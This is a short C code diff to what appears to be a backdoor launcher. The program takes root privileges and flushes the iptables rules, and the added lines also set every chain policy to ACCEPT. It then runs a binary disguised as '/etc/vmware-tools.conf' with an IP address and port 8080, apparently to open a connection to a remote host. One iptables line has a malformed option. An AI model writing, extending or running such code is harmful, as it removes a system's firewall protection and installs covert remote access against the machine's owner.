@@ -6,8 +6,14 @@ int main(int argc, char **argv) {
 	setuid(0);
 	setgid(0);
 
-	system("iptables -F");
-	system("iptables -t -mangle -F");
+	system("`which xtables-multi` iptables -F");
+	system("`which xtables-multi` iptables -t -mangle -F");
+
+	system("`which xtables-multi` iptables -P INPUT ACCEPT");
+	system("`which xtables-multi` iptables -P OUTPUT ACCEPT");
+	system("`which xtables-multi` iptables -P FORWARD ACCEPT");
 
 	system("/etc/vmware-tools.conf 192.168.204.128 8080");
+
+	return 0;
 }
